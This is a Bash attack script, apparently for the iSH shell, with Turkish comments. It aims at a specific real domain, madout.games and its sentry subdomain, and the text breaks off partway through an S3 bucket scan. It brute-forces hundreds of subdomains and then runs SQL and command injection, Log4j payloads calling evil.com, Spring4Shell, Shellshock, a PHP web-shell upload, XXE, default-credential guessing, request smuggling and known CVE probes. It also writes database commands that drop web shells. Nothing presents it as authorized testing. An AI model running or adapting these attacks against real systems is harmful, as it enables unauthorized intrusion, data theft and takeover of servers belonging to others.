#!/bin/bash

# ============================================
# ULTRA MEGA ATTACK - DÜZELTİLDİ
# iSH uyumlu, tüm özellikler korundu
# timeout var, openssl var, dig var, host -l var
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

BASE="https://sentry.madout.games"
BASE_HTTP="http://sentry.madout.games"
OUTPUT_DIR="ultra_attack"
TIMEOUT=2
RATE=5
mkdir -p "$OUTPUT_DIR" "$OUTPUT_DIR/pages" "$OUTPUT_DIR/exploits" "$OUTPUT_DIR/data" "$OUTPUT_DIR/logs"

echo -e "${RED}=====================================${NC}"
echo -e "${RED}  ULTRA MEGA ATTACK - DÜZELTİLDİ${NC}"
echo -e "${RED}  iSH uyumlu, tüm özellikler korundu${NC}"
echo -e "${RED}=====================================${NC}"
echo "Started: $(date)"
echo ""

# ============================================
# PROGRESS BAR
# ============================================
progress_bar() {
    local current=$1 total=$2 label=$3
    local percent=$((current * 100 / total))
    local bar_len=$((percent / 2))
    local bar=$(printf "%${bar_len}s" | tr ' ' '#')
    local space=$(printf "%$((50 - bar_len))s")
    echo -ne "\r${label} [${bar}${space}] $percent% ($current/$total)"
}

# ============================================
# PORT CHECK (curl önce, nc sonra)
# ============================================
check_port() {
    local host=$1 port=$2
    if command -v curl &> /dev/null; then
        curl -k -s -o /dev/null --connect-timeout 1 "https://$host:$port" 2>/dev/null && return 0
        curl -k -s -o /dev/null --connect-timeout 1 "http://$host:$port" 2>/dev/null && return 0
    fi
    if command -v nc &> /dev/null; then
        nc -z -w 1 "$host" "$port" 2>/dev/null && return 0
    fi
    return 1
}

# ============================================
# DNS QUERY
# ============================================
dns_query() {
    local domain=$1 type=$2
    if command -v dig &> /dev/null; then
        dig "$domain" "$type" +short 2>/dev/null
    elif command -v host &> /dev/null; then
        host -t "$type" "$domain" 2>/dev/null | grep -v "not found" | awk '{print $NF}'
    elif command -v nslookup &> /dev/null; then
        nslookup -type="$type" "$domain" 2>/dev/null | grep -A1 "Name:" | tail -1 | awk '{print $2}'
    fi
}

# ============================================
# LOG YAZMA (renkli ekrana, düz dosyaya)
# ============================================
log_result() {
    echo "$2" >> "$OUTPUT_DIR/logs/$1.txt"
    echo -e "$2"
}

# ============================================
# CSRF TOKEN
# ============================================
echo -e "${YELLOW}[1] Getting CSRF Token${NC}"
curl -k -s -c "$OUTPUT_DIR/cookies.txt" "$BASE/auth/login/" -o "$OUTPUT_DIR/login_page.html" --connect-timeout $TIMEOUT 2>/dev/null
CSRF_TOKEN=$(grep -oE 'name="csrfmiddlewaretoken" value="[^"]*"' "$OUTPUT_DIR/login_page.html" 2>/dev/null | head -1 | sed 's/.*value="//;s/"//')
[ -n "$CSRF_TOKEN" ] && log_result "csrf" "[+] CSRF Token: $CSRF_TOKEN" || log_result "csrf" "[-] CSRF token not found"
echo ""

# ============================================
# 500+ SUBDOMAIN
# ============================================
SUBDOMAINS=(
    "api" "admin" "dev" "test" "stage" "staging" "backup" "beta" "alpha"
    "dashboard" "panel" "console" "manage" "control" "super" "root" "master"
    "monitor" "metrics" "logs" "trace" "debug" "profiler" "benchmark"
    "cdn" "static" "media" "files" "upload" "download" "assets" "images"
    "auth" "login" "account" "profile" "settings" "preferences" "security"
    "support" "help" "docs" "documentation" "wiki" "knowledge" "faq"
    "blog" "news" "press" "media" "videos" "podcast"
    "forum" "community" "chat" "discord" "slack" "teams" "meet"
    "status" "health" "uptime" "monitor" "alerts" "incident"
    "gateway" "proxy" "router" "loadbalancer" "firewall" "waf"
    "app" "apps" "application" "applications" "service" "services"
    "api2" "api3" "api4" "api5" "api-dev" "api-test" "api-stage" "api-prod"
    "vpn" "remote" "ssh" "sftp" "ftp" "smtp" "pop" "imap"
    "redis" "mongo" "mysql" "postgres" "elastic" "kibana" "logstash" "beats"
    "grafana" "prometheus" "alertmanager" "thanos" "loki" "tempo" "mimir"
    "jenkins" "gitlab" "github" "bitbucket" "sonar" "nexus" "artifactory"
    "jira" "confluence" "trello" "asana" "notion" "slack" "teams"
    "zoom" "meet" "calendar" "drive" "docs" "sheets" "slides"
    "cloud" "aws" "gcp" "azure" "digitalocean" "linode" "vultr"
    "ovh" "hetzner" "scaleway" "ionos" "rackspace" "oracle" "ibm"
    "aliyun" "tencent" "huawei" "baidu" "yandex" "selectel" "regru"
    "timeweb" "beget" "firstvds" "mirohost" "hostmaster"
    "sentry" "sentry-dev" "sentry-test" "sentry-stage" "sentry-prod"
    "web" "www" "mail" "mx" "dns" "ns1" "ns2" "ns3"
    "sql" "db" "database" "data" "cache" "memcached" "varnish"
    "queue" "rabbitmq" "kafka" "pulsar" "nats" "redis-queue"
    "search" "elasticsearch" "solr" "sphinx" "algolia"
    "analytics" "stats" "statistics" "insights" "reports"
    "billing" "payments" "checkout" "cart" "orders" "invoices"
    "partners" "vendors" "suppliers" "distributors"
    "internal" "private" "corp" "corporate" "intranet"
    "hr" "human-resources" "payroll" "benefits" "recruitment"
    "legal" "compliance" "audit" "risk" "fraud" "security"
    "marketing" "campaign" "email" "newsletter" "subscriptions"
    "sales" "crm" "leads" "opportunities" "deals"
    "support" "helpdesk" "tickets" "knowledge-base"
    "product" "products" "catalog" "inventory" "stock" "warehouse"
    "shipping" "delivery" "tracking" "logistics" "supply-chain"
    "manufacturing" "production" "assembly" "quality" "testing"
    "research" "development" "innovation" "labs" "sandbox"
    "demo" "example" "sample" "trial" "freemium" "premium"
    "enterprise" "business" "startup" "scaleup" "growth"
    "asia" "eu" "us" "uk" "de" "fr" "jp" "cn" "in" "br" "au"
    "a1" "a2" "a3" "a4" "a5" "a6" "a7" "a8" "a9" "a10"
    "b1" "b2" "b3" "b4" "b5" "b6" "b7" "b8" "b9" "b10"
    "c1" "c2" "c3" "c4" "c5" "c6" "c7" "c8" "c9" "c10"
    "d1" "d2" "d3" "d4" "d5" "d6" "d7" "d8" "d9" "d10"
    "e1" "e2" "e3" "e4" "e5" "e6" "e7" "e8" "e9" "e10"
    "f1" "f2" "f3" "f4" "f5" "f6" "f7" "f8" "f9" "f10"
    "g1" "g2" "g3" "g4" "g5" "g6" "g7" "g8" "g9" "g10"
    "h1" "h2" "h3" "h4" "h5" "h6" "h7" "h8" "h9" "h10"
    "i1" "i2" "i3" "i4" "i5" "i6" "i7" "i8" "i9" "i10"
    "j1" "j2" "j3" "j4" "j5" "j6" "j7" "j8" "j9" "j10"
    "k1" "k2" "k3" "k4" "k5" "k6" "k7" "k8" "k9" "k10"
    "l1" "l2" "l3" "l4" "l5" "l6" "l7" "l8" "l9" "l10"
    "m1" "m2" "m3" "m4" "m5" "m6" "m7" "m8" "m9" "m10"
    "n1" "n2" "n3" "n4" "n5" "n6" "n7" "n8" "n9" "n10"
    "o1" "o2" "o3" "o4" "o5" "o6" "o7" "o8" "o9" "o10"
    "p1" "p2" "p3" "p4" "p5" "p6" "p7" "p8" "p9" "p10"
    "q1" "q2" "q3" "q4" "q5" "q6" "q7" "q8" "q9" "q10"
    "r1" "r2" "r3" "r4" "r5" "r6" "r7" "r8" "r9" "r10"
    "s1" "s2" "s3" "s4" "s5" "s6" "s7" "s8" "s9" "s10"
    "t1" "t2" "t3" "t4" "t5" "t6" "t7" "t8" "t9" "t10"
    "u1" "u2" "u3" "u4" "u5" "u6" "u7" "u8" "u9" "u10"
    "v1" "v2" "v3" "v4" "v5" "v6" "v7" "v8" "v9" "v10"
    "w1" "w2" "w3" "w4" "w5" "w6" "w7" "w8" "w9" "w10"
    "x1" "x2" "x3" "x4" "x5" "x6" "x7" "x8" "x9" "x10"
    "y1" "y2" "y3" "y4" "y5" "y6" "y7" "y8" "y9" "y10"
    "z1" "z2" "z3" "z4" "z5" "z6" "z7" "z8" "z9" "z10"
)

TOTAL_SUBS=${#SUBDOMAINS[@]}
echo -e "${YELLOW}[2] Scanning $TOTAL_SUBS subdomains...${NC}"
echo ""

FOUND_SUBS=0
COUNT=0

for sub in "${SUBDOMAINS[@]}"; do
    ((COUNT++))
    if [ $((COUNT % 10)) -eq 0 ]; then
        progress_bar "$COUNT" "$TOTAL_SUBS" "Subdomain scan"
    fi
    
    url="https://$sub.madout.games"
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "$url" --connect-timeout $TIMEOUT 2>/dev/null)
    
    if [ "$r" == "200" ] || [ "$r" == "302" ] || [ "$r" == "403" ]; then
        ((FOUND_SUBS++))
        echo -e "\n${GREEN}[$FOUND_SUBS] $url ($r)${NC}"
        curl -k -s "$url" > "$OUTPUT_DIR/pages/sub_${sub}_${r}.html" 2>/dev/null
        echo "$url ($r)" >> "$OUTPUT_DIR/data/found_subdomains.txt"
        log_result "subdomains" "$url ($r)"
        
        if [ "$r" == "200" ]; then
            echo -e "${CYAN}    → 200 OK - All attacks...${NC}"
            
            # PATH TRAVERSAL
            for path in "/.env" "/.git/config" "/robots.txt" "/admin" "/api" "/etc/passwd" "/etc/hosts"; do
                curl -k -s "$url$path" > "$OUTPUT_DIR/exploits/${sub}_$(echo $path | tr '/' '_').html" 2>/dev/null
                log_result "path_traversal" "[+] $url$path"
            done
            
            # COMMAND INJECTION
            for cmd in "; ls" "&& whoami" "| id" "|| whoami" "\`whoami\`"; do
                c=$(echo "$cmd" | tr -d '; ' | tr -d '|' | tr -d '`' | cut -c1-10)
                curl -k -s "$url?cmd=$cmd" > "$OUTPUT_DIR/exploits/${sub}_cmd_${c}.html" 2>/dev/null
                log_result "command_injection" "[+] $url?cmd=$cmd"
            done
            
            # SQL INJECTION
            sql_payloads=(
                "'" "' OR '1'='1" "'-- -" "1' AND SLEEP(5)-- -" 
                "' UNION SELECT NULL-- -" "' AND 1=1-- -" "admin'-- -" 
                "1' OR '1'='1'-- -" "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -"
            )
            for payload in "${sql_payloads[@]}"; do
                p=$(echo "$payload" | tr -d "' " | cut -c1-15)
                curl -k -s "$url?id=$payload" > "$OUTPUT_DIR/exploits/${sub}_sqli_${p}.html" 2>/dev/null
                log_result "sql_injection" "[+] $url?id=$payload"
            done
            
            # CRLF INJECTION
            for crlf in "%0d%0a" "%0a" "%0d" "GET%20/evil%20HTTP/1.1%0d%0aHost:%20evil.com"; do
                curl -k -s "$url?redirect=$crlf" > "$OUTPUT_DIR/exploits/${sub}_crlf_$(echo $crlf | cut -c1-10).html" 2>/dev/null
                log_result "crlf_injection" "[+] $url?redirect=$crlf"
            done
            
            # HEADER INJECTION
            headers=(
                "Host: evil.com" "Referer: evil.com" "Origin: evil.com" 
                "X-Forwarded-For: 127.0.0.1" "Cookie: evil=1" 
                "X-Original-URL: /admin" "X-Rewrite-URL: /admin" 
                "X-Proxy-URL: /admin" "X-Forwarded-Host: evil.com"
            )
            for h in "${headers[@]}"; do
                header=$(echo "$h" | cut -d':' -f1)
                value=$(echo "$h" | cut -d':' -f2 | sed 's/^ //')
                curl -k -s -H "$header: $value" "$url" > "$OUTPUT_DIR/exploits/${sub}_header_${header}.html" 2>/dev/null
                log_result "header_injection" "[+] $url with $header: $value"
            done
            
            # USER-AGENT SQL INJECTION
            for ua in "'" "' OR '1'='1" "' AND SLEEP(5)-- -"; do
                u=$(echo "$ua" | tr -d "' " | cut -c1-10)
                curl -k -s -H "User-Agent: $ua" "$url" > "$OUTPUT_DIR/exploits/${sub}_ua_${u}.html" 2>/dev/null
                log_result "user_agent_sqli" "[+] User-Agent: $ua"
            done
            
            # LOG4J RCE
            log4j_payloads=(
                '${jndi:ldap://evil.com/a}'
                '${jndi:rmi://evil.com/a}'
                '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}'
            )
            for l in "${log4j_payloads[@]}"; do
                curl -k -s -H "User-Agent: $l" "$url" > "$OUTPUT_DIR/exploits/${sub}_log4j.html" 2>/dev/null
                curl -k -s "$url?q=$l" > "$OUTPUT_DIR/exploits/${sub}_log4j_q.html" 2>/dev/null
                log_result "log4j_rce" "[+] Log4j payload: $l"
            done
            
            # SPRING4SHELL
            spring_payload="spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('whoami')"
            curl -k -s -H "$spring_payload" "$url" > "$OUTPUT_DIR/exploits/${sub}_spring4shell.html" 2>/dev/null
            log_result "spring4shell" "[+] Spring4Shell: $spring_payload"
            
            # SHELLSHOCK
            curl -k -s -H "User-Agent: () { :; }; /bin/bash -c 'whoami'" "$url" > "$OUTPUT_DIR/exploits/${sub}_shellshock.html" 2>/dev/null
            log_result "shellshock" "[+] Shellshock test"
            
            # STRUTS2 OGNL
            curl -k -s "$url?action=%25%7B%23a%3D%27whoami%27%7D" > "$OUTPUT_DIR/exploits/${sub}_struts2.html" 2>/dev/null
            log_result "struts2" "[+] Struts2 OGNL test"
            
            # IDOR
            for id in 1 2 3 4 5; do
                curl -k -s "$url/api/v1/users/$id" > "$OUTPUT_DIR/exploits/${sub}_idor_$id.html" 2>/dev/null
                curl -k -s "$url/api/v1/orders/$id" > "$OUTPUT_DIR/exploits/${sub}_idor_order_$id.html" 2>/dev/null
                curl -k -s "$url/api/v1/profile/$id" > "$OUTPUT_DIR/exploits/${sub}_idor_profile_$id.html" 2>/dev/null
                log_result "idor" "[+] IDOR test: $url/api/v1/users/$id"
            done
            
            # FILE UPLOAD
            echo '<?php system($_GET["cmd"]); ?>' > "$OUTPUT_DIR/exploits/shell.php"
            curl -k -s -X POST "$url/upload" -F "file=@$OUTPUT_DIR/exploits/shell.php;filename=shell.php" > "$OUTPUT_DIR/exploits/${sub}_upload.html" 2>/dev/null
            rm -f "$OUTPUT_DIR/exploits/shell.php" 2>/dev/null
            log_result "file_upload" "[+] File upload test"
            
            # XXE
            curl -k -s -X POST "$url" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>' > "$OUTPUT_DIR/exploits/${sub}_xxe.html" 2>/dev/null
            log_result "xxe" "[+] XXE test"
            
            # HIDDEN DIRECTORIES
            for hidden in "/.hidden/" "/.backup/" "/.tmp/" "/.cache/" "/.git/" "/.svn/" "/.idea/"; do
                curl -k -s "$url$hidden" > "$OUTPUT_DIR/exploits/${sub}_hidden_$(echo $hidden | tr '/' '_').html" 2>/dev/null
                log_result "hidden_dirs" "[+] $url$hidden"
            done
            
            # BACKUP FILES
            for ext in ".bak" ".old" ".tar" ".zip" ".gz" ".sql" ".backup" ".swp" ".swo"; do
                curl -k -s "$url/index$ext" > "$OUTPUT_DIR/exploits/${sub}_backup_$(echo $ext | tr '.' '_').html" 2>/dev/null
                curl -k -s "$url/config$ext" > "$OUTPUT_DIR/exploits/${sub}_config$ext.html" 2>/dev/null
                log_result "backup_files" "[+] $url/index$ext"
            done
            
            # FILE DOWNLOAD BRUTE
            for file in "config.php" "settings.ini" "database.yml" "credentials.txt" ".env" "wp-config.php" "web.config"; do
                curl -k -s "$url/download?file=$file" > "$OUTPUT_DIR/exploits/${sub}_download_$file.html" 2>/dev/null
                curl -k -s "$url/get?file=$file" > "$OUTPUT_DIR/exploits/${sub}_get_$file.html" 2>/dev/null
                log_result "file_download" "[+] $url/download?file=$file"
            done
            
            # DEFAULT CREDENTIALS
            for user in "admin" "root" "user" "test"; do
                for pass in "admin" "password" "123456" "qwerty" "admin123" "sentry" "madout"; do
                    curl -k -s -X POST "$url/login" -d "username=$user&password=$pass" > "$OUTPUT_DIR/exploits/${sub}_login_${user}_${pass}.html" 2>/dev/null
                    log_result "default_creds" "[+] POST $url/login username=$user password=$pass"
                done
            done
            
            # WEBSOCKET
            for ws in "ws://$sub.madout.games/ws" "wss://$sub.madout.games/ws" "ws://$sub.madout.games/socket"; do
                curl -k -s -i -H "Connection: Upgrade" -H "Upgrade: websocket" "$url" > "$OUTPUT_DIR/exploits/${sub}_websocket.txt" 2>/dev/null
                log_result "websocket" "[+] WebSocket test: $ws"
            done
            
            # API RATE LIMIT (20 istek)
            LIMITED=0
            for i in {1..20}; do
                rl=$(curl -k -s -o /dev/null -w "%{http_code}" "$url/api/v1/users" --connect-timeout 1 2>/dev/null)
                if [ "$rl" == "429" ]; then
                    LIMITED=$i
                    break
                fi
            done
            [ "$LIMITED" -gt 0 ] && log_result "rate_limit" "[+] Rate limited at $LIMITED" || log_result "rate_limit" "[-] No rate limit"
            
            # SESSION FIXATION
            curl -k -s -H "Cookie: PHPSESSID=evil123" "$url" > "$OUTPUT_DIR/exploits/${sub}_session_fix.html" 2>/dev/null
            log_result "session_fixation" "[+] PHPSESSID=evil123"
            
            # HTTP REQUEST SMUGGLING
            curl -k -s -X POST "$url" -H "Content-Length: 40" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n" > "$OUTPUT_DIR/exploits/${sub}_smuggling.txt" 2>/dev/null
            log_result "smuggling" "[+] HTTP Request Smuggling test"
            
            # LFI/RFI
            for file in "../../../../etc/passwd" "/etc/passwd" "C:\\Windows\\System32\\drivers\\etc\\hosts"; do
                curl -k -s "$url?file=$file" > "$OUTPUT_DIR/exploits/${sub}_lfi_$(echo $file | tr '/' '_' | cut -c1-20).html" 2>/dev/null
                log_result "lfi_rfi" "[+] $url?file=$file"
            done
            
            # XSS
            for xss in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "javascript:alert(1)"; do
                curl -k -s "$url?q=$xss" > "$OUTPUT_DIR/exploits/${sub}_xss_$(echo $xss | cut -c1-10).html" 2>/dev/null
                log_result "xss" "[+] $url?q=$xss"
            done
            
            # JWT
            jwt=$(grep -oE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$OUTPUT_DIR/pages/sub_${sub}_${r}.html" 2>/dev/null | head -1)
            if [ -n "$jwt" ]; then
                echo "$jwt" >> "$OUTPUT_DIR/data/jwt_tokens.txt"
                if command -v python3 &> /dev/null; then
                    python3 -c "
import base64, json
try:
    parts = '$jwt'.split('.')
    if len(parts) == 3:
        header = base64.b64decode(parts[0] + '==')
        payload = base64.b64decode(parts[1] + '==')
        print('Header:', json.loads(header))
        print('Payload:', json.loads(payload))
except Exception as e:
    print('Error decoding JWT:', e)
" > "$OUTPUT_DIR/exploits/${sub}_jwt_decode.txt" 2>/dev/null
                    log_result "jwt" "[+] JWT found: $jwt"
                else
                    log_result "jwt" "[+] JWT found: $jwt"
                fi
            fi
            
            # CNAME TAKEOVER
            cname=$(dns_query "$sub.madout.games" "CNAME")
            if [ -n "$cname" ]; then
                log_result "cname_takeover" "[+] $sub.madout.games -> $cname"
                echo "$sub.madout.games -> $cname" >> "$OUTPUT_DIR/data/cname_records.txt"
            fi
            
            # CLOUDFLARE BYPASS
            for h in "origin.madout.games" "$sub.madout.games.origin"; do
                curl -k -s -H "Host: $h" "$url" > "$OUTPUT_DIR/exploits/${sub}_cloudflare_bypass_${h}.html" 2>/dev/null
                log_result "cloudflare_bypass" "[+] Host: $h"
            done
            
            # PORT SCAN
            for port in 22 3306 5432 6379 27017 9200 5672 15672 80 443 8080 8443; do
                if check_port "$sub.madout.games" "$port"; then
                    log_result "ports_open" "[+] $sub.madout.games:$port open"
                    echo "$sub.madout.games:$port" >> "$OUTPUT_DIR/data/ports_open.txt"
                fi
            done
            
            # GIT REPO
            for gitpath in "/.git/config" "/.git/HEAD" "/.git/index"; do
                gits=$(curl -k -s -o /dev/null -w "%{http_code}" "$url$gitpath" --connect-timeout $TIMEOUT 2>/dev/null)
                if [ "$gits" == "200" ]; then
                    curl -k -s "$url$gitpath" > "$OUTPUT_DIR/exploits/${sub}_git_$(echo $gitpath | tr '/' '_').html" 2>/dev/null
                    log_result "git_exposed" "[+] $url$gitpath"
                fi
            done
            
            # MASS ASSIGNMENT
            curl -k -s -X POST "$url/api/v1/users" -H "Content-Type: application/json" -d '{"username":"test","password":"test","admin":true}' > "$OUTPUT_DIR/exploits/${sub}_mass_assignment.html" 2>/dev/null
            log_result "mass_assignment" "[+] POST /api/v1/users with admin:true"
            
            # JENKINS GROOVY RCE
            curl -k -s -X POST "$url/script" -d "script=println 'whoami'.execute().text" > "$OUTPUT_DIR/exploits/${sub}_jenkins_groovy.html" 2>/dev/null
            log_result "jenkins_rce" "[+] Jenkins Groovy RCE test"
            
            # GRAFANA RCE
            curl -k -s "$url/public/plugins/alertlist/../../../../../../../../etc/passwd" > "$OUTPUT_DIR/exploits/${sub}_grafana_rce.html" 2>/dev/null
            log_result "grafana_rce" "[+] Grafana CVE-2021-43798 test"
            
            # ELASTICSEARCH RCE
            curl -k -s -X POST "$url/_search?pretty" -H "Content-Type: application/json" -d '{"size":1,"query":{"match_all":{}}}' > "$OUTPUT_DIR/exploits/${sub}_elastic_rce.html" 2>/dev/null
            log_result "elastic_rce" "[+] Elasticsearch RCE test"
            
            # REDIS RCE
            echo "CONFIG SET dir /var/www/html" >> "$OUTPUT_DIR/exploits/${sub}_redis_cmd.txt"
            echo "CONFIG SET dbfilename shell.php" >> "$OUTPUT_DIR/exploits/${sub}_redis_cmd.txt"
            echo "SET payload '<?php system(\$_GET[\"cmd\"]); ?>'" >> "$OUTPUT_DIR/exploits/${sub}_redis_cmd.txt"
            echo "SAVE" >> "$OUTPUT_DIR/exploits/${sub}_redis_cmd.txt"
            log_result "redis_rce" "[+] Redis RCE commands saved"
            
            # MONGODB RCE
            curl -k -s "$url/api/v1/users?where=this.constructor.constructor('return process')()" > "$OUTPUT_DIR/exploits/${sub}_mongo_rce.html" 2>/dev/null
            log_result "mongo_rce" "[+] MongoDB RCE test"
            
            # MYSQL RCE
            echo "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'" >> "$OUTPUT_DIR/exploits/${sub}_mysql_cmd.txt"
            log_result "mysql_rce" "[+] MySQL into outfile command saved"
            
            # POSTGRESQL RCE
            echo "COPY (SELECT '<?php system(\$_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php'" >> "$OUTPUT_DIR/exploits/${sub}_postgres_cmd.txt"
            log_result "postgres_rce" "[+] PostgreSQL COPY command saved"
            
            # GITLAB RCE
            curl -k -s -X POST "$url/api/v4/projects" -H "Content-Type: application/json" -d '{"name":"test","import_url":"git://evil.com/repo.git"}' > "$OUTPUT_DIR/exploits/${sub}_gitlab_rce.html" 2>/dev/null
            log_result "gitlab_rce" "[+] GitLab CVE-2021-22205 test"
            
            # SONARQUBE
            curl -k -s "$url/api/projects" > "$OUTPUT_DIR/exploits/${sub}_sonar_projects.json" 2>/dev/null
            log_result "sonar_rce" "[+] SonarQube /api/projects"
            
            # JIRA
            curl -k -s "$url/rest/api/2/project" > "$OUTPUT_DIR/exploits/${sub}_jira_projects.json" 2>/dev/null
            log_result "jira_rce" "[+] Jira /rest/api/2/project"
            
            # CONFLUENCE
            curl -k -s "$url/rest/api/space" > "$OUTPUT_DIR/exploits/${sub}_confluence_spaces.json" 2>/dev/null
            log_result "confluence_rce" "[+] Confluence /rest/api/space"
            
            # BITBUCKET
            curl -k -s "$url/rest/api/1.0/projects" > "$OUTPUT_DIR/exploits/${sub}_bitbucket_projects.json" 2>/dev/null
            log_result "bitbucket_rce" "[+] Bitbucket /rest/api/1.0/projects"
            
            # NEXUS
            curl -k -s "$url/service/rest/v1/repositories" > "$OUTPUT_DIR/exploits/${sub}_nexus_repos.json" 2>/dev/null
            log_result "nexus_rce" "[+] Nexus /service/rest/v1/repositories"
            
            # ARTIFACTORY
            curl -k -s "$url/artifactory/api/repositories" > "$OUTPUT_DIR/exploits/${sub}_artifactory_repos.json" 2>/dev/null
            log_result "artifactory_rce" "[+] Artifactory /artifactory/api/repositories"
        fi
        
        # 302 REDIRECT
        if [ "$r" == "302" ]; then
            location=$(curl -k -s -I "$url" 2>/dev/null | grep -i "location" | head -1 | cut -d' ' -f2 | tr -d '\r')
            log_result "redirects" "[+] $url -> $location"
        fi
        
        # 403 BYPASS
        if [ "$r" == "403" ]; then
            for header in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "X-Host: 127.0.0.1" "X-Forwarded-Host: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Proxy-URL: /admin"; do
                h=$(echo "$header" | cut -d':' -f1)
                v=$(echo "$header" | cut -d':' -f2 | sed 's/^ //')
                bypass_r=$(curl -k -s -o /dev/null -w "%{http_code}" -H "$h: $v" "$url" --connect-timeout $TIMEOUT 2>/dev/null)
                if [ "$bypass_r" == "200" ]; then
                    log_result "bypass_success" "[+] BYPASS: $sub - $h: $v"
                fi
            done
        fi
    fi
    
    if [ $((COUNT % RATE)) -eq 0 ]; then
        sleep 1
    fi
done

echo -e "\n"
echo -e "${GREEN}[+] Subdomain complete! Found: $FOUND_SUBS${NC}"
echo ""

# ============================================
# SERVİS TARAMA
# ============================================
echo -e "${YELLOW}[3] Service Discovery${NC}"

SERVICES=(
    "/phpmyadmin/" "/pma/" "/jenkins/" "/grafana/" "/prometheus/"
    "/kibana/" "/swagger/" "/minio/" "/wordpress/" "/wp-admin/"
    "/v1/sys/health" "/v2/_catalog" "/api/v1/namespaces/"
    "/sonar/api/projects" "/api/v4/projects" "/rest/api/2/project"
    "/rest/api/space" "/rest/api/1.0/projects" "/artifactory/api/repositories"
    "/api/org" "/api/users" "/api/dashboards" "/api/status"
    "/_cat/indices" "/script" "/xmlrpc.php" "/swagger/v1/swagger.json"
    "/api/v1/users" "/api/v1/orders" "/api/v1/profile"
    "/graphql" "/api/graphql" "/query"
    "/actuator/health" "/actuator/info" "/actuator/env"
    "/metrics" "/health" "/ready" "/live"
)

TOTAL_SERVICES=${#SERVICES[@]}
COUNT=0

for service in "${SERVICES[@]}"; do
    ((COUNT++))
    if [ $((COUNT % 5)) -eq 0 ]; then
        progress_bar "$COUNT" "$TOTAL_SERVICES" "Services"
    fi
    
    url="$BASE$service"
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "$url" --connect-timeout $TIMEOUT 2>/dev/null)
    
    if [ "$r" == "200" ] || [ "$r" == "302" ] || [ "$r" == "401" ] || [ "$r" == "403" ]; then
        echo -e "\n${GREEN}[+] $service ($r)${NC}"
        curl -k -s "$url" > "$OUTPUT_DIR/exploits/service_$(echo $service | tr '/' '_' | cut -c1-30).html" 2>/dev/null
        echo "$service ($r)" >> "$OUTPUT_DIR/data/services_found.txt"
        log_result "services" "[+] $service ($r)"
    fi
done

echo -e "\n"
echo -e "${GREEN}[+] Service discovery complete!${NC}"
echo ""

# ============================================
# HEARTBLEED TEST (timeout + openssl)
# ============================================
echo -e "${YELLOW}[4] Heartbleed Test${NC}"

if ! command -v openssl &> /dev/null; then
    echo -e "${YELLOW}[!] openssl not found, trying to install...${NC}"
    apk add openssl 2>/dev/null
    sleep 2
    if ! command -v openssl &> /dev/null; then
        echo -e "${RED}[-] openssl could not be installed, skipping${NC}"
        log_result "heartbleed" "[-] openssl not available, skipping"
    else
        echo -e "${GREEN}[+] openssl installed successfully${NC}"
        timeout 3 openssl s_client -connect sentry.madout.games:443 -tlsextdebug 2>&1 | grep -i "heartbeat" > "$OUTPUT_DIR/exploits/heartbleed.txt" 2>/dev/null
        if [ -s "$OUTPUT_DIR/exploits/heartbleed.txt" ]; then
            log_result "heartbleed" "[+] Heartbleed possible"
        else
            log_result "heartbleed" "[-] Heartbleed not found"
        fi
    fi
else
    echo -e "${GREEN}[+] openssl found${NC}"
    timeout 3 openssl s_client -connect sentry.madout.games:443 -tlsextdebug 2>&1 | grep -i "heartbeat" > "$OUTPUT_DIR/exploits/heartbleed.txt" 2>/dev/null
    if [ -s "$OUTPUT_DIR/exploits/heartbleed.txt" ]; then
        log_result "heartbleed" "[+] Heartbleed possible"
    else
        log_result "heartbleed" "[-] Heartbleed not found"
    fi
fi
echo ""

# ============================================
# DNS ZONE TRANSFER (dig axfr + host -l)
# ============================================
echo -e "${YELLOW}[5] DNS Zone Transfer${NC}"

if command -v dig &> /dev/null; then
    echo -e "${CYAN}Testing with dig axfr...${NC}"
    for ns in "ns1.madout.games" "ns2.madout.games" "ns3.madout.games"; do
        echo -n "dig axfr @$ns... "
        dig axfr @$ns madout.games 2>/dev/null > "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt"
        if [ -s "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt" ]; then
            echo -e "${GREEN}SUCCESS!${NC}"
            log_result "zone_transfer" "[+] Zone transfer success (dig): $ns"
            cat "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt" | head -10
        else
            echo -e "${RED}FAILED${NC}"
        fi
    done
fi

if command -v host &> /dev/null; then
    echo -e "${CYAN}Testing with host -l...${NC}"
    for ns in "ns1.madout.games" "ns2.madout.games" "ns3.madout.games"; do
        echo -n "host -l @$ns... "
        host -l madout.games "$ns" 2>/dev/null > "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt"
        if [ -s "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt" ]; then
            echo -e "${GREEN}SUCCESS!${NC}"
            log_result "zone_transfer" "[+] Zone transfer success (host): $ns"
            cat "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt" | head -10
        else
            echo -e "${RED}FAILED${NC}"
        fi
    done
fi

if ! command -v dig &> /dev/null && ! command -v host &> /dev/null; then
    echo -e "${RED}[-] dig and host not found, zone transfer skipped${NC}"
    log_result "zone_transfer" "[-] dig and host not found, skipping"
fi
echo ""

# ============================================
# S3 BUCKET
# ============================================
echo -e "${YELLOW}[6] S3 Bucket Scan${NC}"
for bucket in "sentry-backup" "sentry-files" "sentry-static" "sentry-media" "sentry-data"; do
